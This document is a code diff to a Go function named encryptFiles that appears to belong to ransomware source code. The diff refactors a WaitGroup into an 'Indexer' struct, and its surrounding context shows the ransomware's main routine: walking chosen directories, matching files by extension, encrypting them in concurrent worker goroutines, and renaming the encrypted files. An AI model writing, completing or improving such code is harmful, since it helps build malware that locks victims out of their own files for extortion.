@@ -117,15 +117,13 @@ func encryptFiles() {
 
 	log.Println("Walking interesting dirs and indexing files...")
 
-	// Setup a waitgroup so we can wait for all goroutines to finish
-	var wg sync.WaitGroup
-
-	wg.Add(1)
+	// Add a goroutine to the WaitGroup
+	cmd.Indexer.Add(1)
 
 	// Indexing files in a concurrently thread
 	go func() {
 		// Decrease the wg count after finish this goroutine
-		defer wg.Done()
+		defer cmd.Indexer.Done()
 
 		// Loop over the interesting directories
 		for _, f := range cmd.InterestingDirs {
@@ -141,10 +139,10 @@ func encryptFiles() {
 						// Send the file to the MatchedFiles channel then workers
 						// can imediatelly proccess then
 						log.Println("Matched:", path)
-						cmd.MatchedFiles <- &cryptofs.File{FileInfo: f, Extension: ext[1:], Path: path}
+						cmd.Indexer.Files <- &cryptofs.File{FileInfo: f, Extension: ext[1:], Path: path}
 
 						//for each file we need wait for the goroutine to finish
-						wg.Add(1)
+						cmd.Indexer.Add(1)
 					}
 				}
 				return nil
@@ -152,7 +150,7 @@ func encryptFiles() {
 		}
 
 		// Close the MatchedFiles channel after all files have been indexed and send to then
-		close(cmd.MatchedFiles)
+		close(cmd.Indexer.Files)
 	}()
 
 	// Process files that are sended to the channel
@@ -161,12 +159,12 @@ func encryptFiles() {
 		go func() {
 			for {
 				select {
-				case file, ok := <-cmd.MatchedFiles:
+				case file, ok := <-cmd.Indexer.Files:
 					// Check if has nothing to receive from the channel(it's closed)
 					if !ok {
 						return
 					}
-					defer wg.Done()
+					defer cmd.Indexer.Done()
 
 					log.Printf("Encrypting %s...\n", file.Path)
 
@@ -213,7 +211,7 @@ func encryptFiles() {
 	}
 
 	// Wait for all goroutines to finish
-	wg.Wait()
+	cmd.Indexer.Wait()
 
 	// Rename the files after all have been encrypted
 	for _, file := range FilesToRename.Files {
